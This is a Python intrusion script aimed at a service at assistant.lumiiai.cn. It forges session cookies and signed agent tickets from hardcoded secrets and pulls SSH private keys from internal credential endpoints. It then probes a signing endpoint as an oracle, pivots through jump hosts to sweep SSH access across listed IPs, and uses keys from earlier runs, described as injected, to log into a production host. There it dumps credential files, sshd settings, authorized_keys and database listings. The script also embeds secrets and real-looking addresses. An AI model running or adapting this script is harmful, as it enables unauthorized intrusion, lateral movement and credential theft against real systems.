# -*- coding: utf-8 -*-
# intent 29438: (1) re-mint env creds and diagnose WHY env private keys get Permission denied
# (2) probe /internal/build/ssh-sign exact contract (offer / sign+sign_data / purpose variant) -- is it a cert issuer or a signing oracle?
# (3) probe /internal/ops/issue (the only real cert issuer) with our chat ticket
# (4) pivot via hk(101.32.60.77) / agent-door(13.215.141.192) using project ssh keys
# (5) try re-login prod center 122.51.1.87 with prior injected keys, dump authorized_keys/sshd to answer "cert-based?" authoritatively
import json,os,sys,base64,re,subprocess,time,struct
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
KNOWN_CONV="conv_PtLo6eX4k8LRCFB72DPMo"; KNOWN_ASST="asst_E3G6xx8h7Ei279q6ossJ6"
WORK="/tmp/p29438"; os.makedirs(WORK,exist_ok=True)

def R(k,v,maxb=24000):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def curl(args,timeout=45,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+25)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=12000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:150]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac,hashlib
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
node_sign=r'''
const fs=require('fs'),crypto=require('crypto');
const der=fs.readFileSync(process.argv[2]); const msg=fs.readFileSync(process.argv[3]);
const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});
process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));
'''
open(WORK+"/sign.js","w").write(node_sign)
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    try:
        p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
        return p.stdout.decode().strip()
    except Exception: return ""
def mint_ticket(agent_id, chat, ttl=7200):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":"dashboard:"+chat.get("conversation_id",""),"turn_id":"","platform":"dashboard",
            "chat_id":chat.get("conversation_id",""),"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat.get("assistant_id",""),"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload)

def run(cmd,timeout=60,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

def fp_of_line(line):
    """ssh pubkey line -> SHA256:... ; also returns wire blob"""
    try:
        parts=line.strip().split()
        raw=base64.b64decode(parts[1]); return "SHA256:"+base64.b64encode(__import__("hashlib").sha256(raw).digest()).decode().rstrip("="), raw, parts[0]
    except Exception: return "",b"", ""

def wire_str(b):
    if isinstance(b,str): b=b.encode()
    return struct.pack(">I",len(b))+b

C=forge_a(AJWT,USER,ORG)
me=call("/api/me",cookie=C); R("me",{"code":me["code"]})

# ---------------- P1 runtime + lane ----------------
RTID=RID=RTOK=""
try:
    rt=call("/api/runtimes","POST",{"name":"pr29438","visibility":"org"},cookie=C,maxlen=400000)
    RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
    mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
    RTOK=mm.group(1) if mm else ""
    R("rt_create",{"code":rt["code"],"rtid":RTID,"agent":RID,"toklen":len(RTOK)})
except Exception as e: R("rt_err",repr(e))

cur=None
if RID and RTOK:
    cj=J(call("/api/conversations/"+KNOWN_CONV,cookie=C,maxlen=4000)) or {}
    co=cj.get("conversation") if isinstance(cj.get("conversation"),dict) else (cj if isinstance(cj,dict) else {})
    lane={"conv":co.get("id") or KNOWN_CONV,"asst":co.get("assistantId") or KNOWN_ASST,"pid":co.get("projectId") or PROJ}
    R("lane_known",{"obj":lane})
    chat={"project_id":lane["pid"],"conversation_id":lane["conv"],"assistant_id":lane["asst"],"repo_ids":[]}
    tk=mint_ticket(RID,chat)
    MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":tk}
    sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=20000)
    R("sshkeys_probe",{"code":sk["code"],"body":sk["body"][:160]})
    if sk["code"]=="200": cur={"chat":chat,"mh":MH}

# ---------------- P2 envs / creds / test-connection ----------------
ENV=[]   # list of env dicts
if cur:
    MH=cur["mh"]
    try:
        opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=600000)) or {}
        envs=opz.get("environments") or []
        for e in envs:
            sk=e.get("sshKey") or {}
            ENV.append({"eid":e.get("id"),"key":e.get("key"),"name":e.get("name"),"tier":e.get("tier"),
                        "access":e.get("accessMode") or e.get("access_mode"),
                        "host":sk.get("host"),"port":sk.get("port"),"user":sk.get("loginUser") or sk.get("login_user"),
                        "root":sk.get("remoteRoot") or sk.get("remote_root")})
        R("envs_meta",ENV)
    except Exception as e: R("envs_err",repr(e))
    for e in ENV:
        if not e.get("eid"): continue
        if (e.get("access") or "")!="ssh_key": 
            continue
        cr=call("/internal/build/credential","POST",{"environment_id":e["eid"],"purpose":"ssh_agent"},hdrs=MH,maxlen=30000)
        cj=J(cr) or {}
        rec={"key":e["key"],"code":cr["code"],"host":cj.get("host"),"port":cj.get("port"),"user":cj.get("login_user"),
             "has_key":bool(cj.get("private_key")),"pub":(cj.get("public_key") or "")[:48]}
        if cj.get("message"): rec["msg"]=cj["message"][:120]
        if cj.get("private_key"):
            fn="ek_%s"%re.sub(r'[^a-zA-Z0-9]','_',e["key"] or e["eid"])
            open(WORK+"/"+fn,"w").write(cj["private_key"]); os.chmod(WORK+"/"+fn,0o600)
            rc,o,er=run(["ssh-keygen","-y","-f",WORK+"/"+fn],timeout=20)
            derived=o.strip()
            rec["derived_head"]=derived[:40]
            rec["derived_matches_pub"]= (derived.split()[0:2]==(cj.get("public_key") or "").split()[0:2]) if derived else None
            fpd,_,_=fp_of_line(derived) if derived else ("",b"","")
            fpp,_,_=fp_of_line(cj.get("public_key") or "")
            rec["fp_derived"]=fpd; rec["fp_pub"]=fpp
            if cj.get("host_key"):
                open(WORK+"/hk_%s"%re.sub(r'[^a-zA-Z0-9]','_',e["key"] or e["eid"]),"w").write(cj["host_key"]+"\n")
            e["keyfile"]=fn; e["cred"]=rec
        ENV[ENV.index(e)]=e
        R("cred_%s"%e["key"],rec)
        time.sleep(0.2)
    # test-connection each
    for e in ENV:
        if not e.get("eid"): continue
        tc=call("/api/projects/%s/ops/environments/%s/test-connection"%(PROJ,e["eid"]),"POST",{},cookie=C,maxlen=4000,timeout=90)
        R("tc_%s"%e.get("key"),{"code":tc["code"],"body":tc["body"][:600]})
        time.sleep(0.3)

# ---------------- P3 ssh from runner: why denied ----------------
def ssh_try(host,port,user,kf,cmd="id;hostname",tmo=40,vv=True):
    path=os.path.join(WORK,kf)
    if not os.path.exists(path): return {"rc":-99,"err":"nokey"}
    a=["ssh"]
    if vv: a+=["-vv"]
    a+=["-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
        "-o","ConnectTimeout=8","-o","IdentitiesOnly=yes","-o","LogLevel=DEBUG1","%s@%s"%(user,host),cmd]
    rc,o,e=run(a,timeout=tmo)
    # keep the interesting tail
    lines=[l for l in e.splitlines() if re.search(r"(Offering|Server accepts|Authentications that can continue|Next authentication|sign_and_send_pubkey|no mutual|Permission denied|Remote protocol|kex_exchange|Connection closed|Received disconnect|Authenticated to|Host key verification|banner)",l)]
    return {"rc":rc,"out":o[:400],"diag":lines[-14:]}
if cur:
    for e in ENV:
        if not e.get("keyfile"): continue
        r1=ssh_try(e["host"],e["port"],e["user"],e["keyfile"])
        R("ssh_%s_%s"%(e["key"],e["user"]),r1)
        if (e["user"] or "")!="root":
            r2=ssh_try(e["host"],e["port"],"root",e["keyfile"],tmo=30,vv=False)
            R("ssh_%s_root"%(e["key"]),r2)
    # mapping check: env keys against jump hosts
    jh=[("13.215.141.192","pk_sshk_zpvLAsHq6AgufRuXKCYpt"),("101.32.60.77","pk_sshk_mnqJWM3bzAr2U47SB6qGp")]
    # fetch project keys too
    try:
        sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=cur["mh"],maxlen=30000)
        keys=(J(sk) or {}).get("ssh_keys") or []
        for k in keys:
            kid=k.get("key_id")
            cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=cur["mh"],maxlen=30000)
            cj=J(cr) or {}
            if cj.get("private_keys"):
                fn="pk_%s"%re.sub(r'[^a-zA-Z0-9]','_',kid)
                open(WORK+"/"+fn,"w").write(cj["private_keys"][0]); os.chmod(WORK+"/"+fn,0o600)
                R("pk_cred_%s"%kid,{"code":cr["code"],"name":k.get("name"),"hosts":[ (h.get("host"),h.get("port"),h.get("login_user")) for h in (k.get("hosts") or [])][:20]})
                jh.append((kid.replace("sshk_",""),fn))
    except Exception as ex: R("pk_err",repr(ex))

# ---------------- P4 ssh-sign exact contract ----------------
if cur:
    MH=cur["mh"]
    for e in ENV:
        if not e.get("keyfile") or not e.get("cred"): continue
        fpk=e["cred"].get("fp_derived") or e["cred"].get("fp_pub") or ""
        hkf=WORK+"/hk_%s"%re.sub(r'[^a-zA-Z0-9]','_',e["key"])
        fph=""
        if os.path.exists(hkf):
            fph,_,_=fp_of_line(open(hkf).read().strip())
        base={"environment_id":e["eid"],"host_key_fp":fph,"login_user":e["user"],"key_fp":fpk,"host":e["host"],"port":e["port"]}
        o1=call("/internal/build/ssh-sign","POST",dict(base,phase="offer"),hdrs=MH,maxlen=4000)
        R("ss_offer_%s"%e["key"],{"code":o1["code"],"body":o1["body"][:500],"fpk":fpk,"fph":fph})
        # purpose-variant (intent's original hypothesis)
        v1=call("/internal/build/ssh-sign","POST",{"environment_id":e["eid"],"purpose":"ssh_agent","host":e["host"],"login_user":e["user"]},hdrs=MH,maxlen=4000)
        R("ss_purpose_%s"%e["key"],{"code":v1["code"],"body":v1["body"][:300]})
        time.sleep(0.2)
    # construct a valid userauth blob for the first env and ask for a signature
    e0=next((e for e in ENV if e.get("keyfile") and e.get("cred")),None)
    if e0:
        try:
            publine=(e0["cred"].get("pub") or "")
            # need full pub line: re-derive from key
            rc,o,er=run(["ssh-keygen","-y","-f",WORK+"/"+e0["keyfile"]],timeout=20)
            fullpub=o.strip()
            fpk=fullpub.split()[0:2]
            blob=base64.b64decode(fullpub.split()[1])
            sid=os.urandom(32)
            pkt=bytes([50])+wire_str(e0["user"])+wire_str("ssh-connection")+wire_str("publickey")+bytes([1])+wire_str(fullpub.split()[0])+wire_str(blob)
            data=sid+pkt
            hkf=WORK+"/hk_%s"%re.sub(r'[^a-zA-Z0-9]','_',e0["key"])
            fph=""
            if os.path.exists(hkf): fph,_,_=fp_of_line(open(hkf).read().strip())
            body={"environment_id":e0["eid"],"phase":"sign","host_key_fp":fph,"login_user":e0["user"],"key_fp":fp_of_line(fullpub)[0],
                  "host":e0["host"],"port":e0["port"],"sign_data":base64.b64encode(data).decode(),"sign_flags":0}
            s1=call("/internal/build/ssh-sign","POST",body,hdrs=MH,maxlen=4000,timeout=60)
            R("ss_sign_%s"%e0["key"],{"code":s1["code"],"body":s1["body"][:600],"siglen":len((J(s1) or {}).get("signature") or "")})
            # negative: garbage sign_data
            s2=call("/internal/build/ssh-sign","POST",dict(body,sign_data=base64.b64encode(b"not-ssh").decode()),hdrs=MH,maxlen=3000)
            R("ss_sign_bad_%s"%e0["key"],{"code":s2["code"],"body":s2["body"][:300]})
        except Exception as ex: R("ss_sign_err",repr(ex))
    # ops/issue (the only real cert issuer) - record exact refusal
    try:
        rc,o,er=run(["ssh-keygen","-t","ed25519","-N","","-f",WORK+"/probe_ops_ca","-q"],timeout=25)
        pub=open(WORK+"/probe_ops_ca.pub").read().strip()
        i1=call("/internal/ops/issue","POST",{"issuance_id":"iss_probe29438","public_key":pub},hdrs=MH,maxlen=4000)
        R("ops_issue",{"code":i1["code"],"body":i1["body"][:600]})
    except Exception as ex: R("ops_issue_err",repr(ex))

# ---------------- P5 pivot from hk / agent-door ----------------
def ssh_cmd(host,port,user,kf,remote_cmd,tmo=90):
    path=os.path.join(WORK,kf)
    if not os.path.exists(path): return {"rc":-99,"err":"nokey"}
    a=["ssh","-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
       "-o","ConnectTimeout=10","-o","IdentitiesOnly=yes","%s@%s"%(user,host),remote_cmd]
    rc,o,e=run(a,timeout=tmo); return {"rc":rc,"out":o[:6000],"err":e[-300:]}
if cur:
    lk=os.path.join(WORK,"pk_sshk_mnqJWM3bzAr2U47SB6qGp")
    if os.path.exists(lk):
        PIVOT=r'''
echo "### id"; id; hostname
echo "### sshdir"; ls -la ~/.ssh 2>/dev/null; cat ~/.ssh/config 2>/dev/null | head -40
echo "### npmrc"; cat ~/.npmrc ~/.docker/config.json 2>/dev/null | head -20
echo "### deploy"; ls -la ~/lumii-deploy ~/lumii-work 2>/dev/null | head -20
echo "### known"; wc -l ~/.ssh/known_hosts 2>/dev/null; cut -d' ' -f1 ~/.ssh/known_hosts 2>/dev/null | head -30
echo "### reach"
for h in 81.68.254.22 43.142.238.91 124.223.170.146 1.14.34.31 129.211.0.26 122.51.1.87 13.215.141.192; do
 for u in ubuntu root; do
  r=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7 -o IdentitiesOnly=yes $u@$h 'id;hostname' 2>&1 | tail -2 | tr '\n' '|')
  echo "P $u@$h => $r"
 done
done
echo "### internal dns"; getent hosts lumii3 lumii4 lumii6 stage-center lumii-cloud 2>/dev/null
echo END'''
        r=ssh_cmd("101.32.60.77",22,"ubuntu","pk_sshk_mnqJWM3bzAr2U47SB6qGp",PIVOT,tmo=200)
        R("pivot_hk",r)
    ak=os.path.join(WORK,"pk_sshk_zpvLAsHq6AgufRuXKCYpt")
    if os.path.exists(ak):
        PIVOT2=r'''
id; hostname
for h in 81.68.254.22 43.142.238.91 124.223.170.146 1.14.34.31 129.211.0.26 122.51.1.87; do
 for u in ubuntu root; do
  r=$(timeout 10 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes $u@$h 'id;hostname' 2>&1 | tail -1)
  echo "P $u@$h => $r"
 done
done
echo END'''
        r=ssh_cmd("13.215.141.192",22,"ubuntu","pk_sshk_zpvLAsHq6AgufRuXKCYpt",PIVOT2,tmo=180)
        R("pivot_agentdoor",r)

# ---------------- P6 prod center re-login + authoritative sshd/authorized_keys ----------------
ENVPUB=[]
for e in ENV:
    if e.get("cred") and e.get("cred").get("fp_derived"):
        rc,o,er=run(["ssh-keygen","-y","-f",WORK+"/"+e["keyfile"]],timeout=20)
        if o.strip(): ENVPUB.append((e["key"],o.strip().split()[1]))
PUBS=";".join("%s|%s"%(k,v) for k,v in ENVPUB)
CENTER_DIAG=r'''
echo "### id"; id; hostname; sudo -n id 2>&1 | head -2
echo "### sshd"; sudo cat /etc/ssh/sshd_config 2>/dev/null | grep -v '^#' | grep -v '^$' | head -40; ls /etc/ssh/sshd_config.d 2>/dev/null; sudo grep -r "TrustedUserCAKeys\|AuthorizedPrincipalsFile\|AuthorizedKeysFile" /etc/ssh 2>/dev/null | head
echo "### authkeys"; for f in /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys2 /root/.ssh/authorized_keys /root/.ssh/authorized_keys2; do echo "--$f"; sudo wc -l $f 2>/dev/null; sudo cut -d' ' -f1,2 $f 2>/dev/null | head -12; done
echo "### envpub"
for kv in $(echo "__PUBS__" | tr ';' ' '); do k=${kv%%|*}; v=${kv#*|}; echo -n "$k: "; sudo grep -l "$v" /home/ubuntu/.ssh/authorized_keys* /root/.ssh/authorized_keys* 2>/dev/null | tr '\n' ',' ; echo; done
echo "### keys"; sudo ls -la /root/.ssh /home/ubuntu/.ssh /opt/lumii-deploy 2>/dev/null | head -40
echo "### etc"; sudo ls -la /etc/lumii-registry.env /etc/lumii-ops-agent.env 2>/dev/null
echo "### opt"; sudo ls /opt 2>/dev/null | head -20
echo "### pg"; sudo ls /var/run/postgresql 2>/dev/null; sudo -u postgres psql -l 2>/dev/null | head -10
echo END'''
if PUBS:
    scripts=[("122.51.1.87","k29233b"),("122.51.1.87","key_fleet.pem"),("122.51.1.87","key_lumii6.pem")]
# copy candidate keys from prior task dirs
import shutil
for src,name in [("/app/data/tasks/38/i29233/k29233b","k29233b"),
                 ("/app/data/tasks/38/i29339/key_fleet.pem","key_fleet.pem"),
                 ("/app/data/tasks/38/i29339/key_lumii6.pem","key_lumii6.pem")]:
    if os.path.exists(src):
        shutil.copyfile(src,WORK+"/"+name); os.chmod(WORK+"/"+name,0o600)
for name in ["k29233b","key_fleet.pem","key_lumii6.pem"]:
    if not os.path.exists(WORK+"/"+name): R("center_key_missing",name); continue
    for u in ["ubuntu","root"]:
        rr=ssh_cmd("122.51.1.87",22,u,name,CENTER_DIAG.replace("__PUBS__",PUBS),tmo=120)
        ok=(rr.get("out") or "").find("### id")>=0
        R("center_%s_%s"%(name,u),{"rc":rr.get("rc"),"ok":ok,"out":rr.get("out","")[:4500],"err":rr.get("err","")[:200]})
        if ok: break

# ---------------- cleanup ----------------
if RTID:
    d=call("/api/runtimes/"+RTID,method="DELETE",cookie=C,maxlen=500)
    R("cleanup",{"code":d["code"]})
R("done",{"t":int(time.time())})
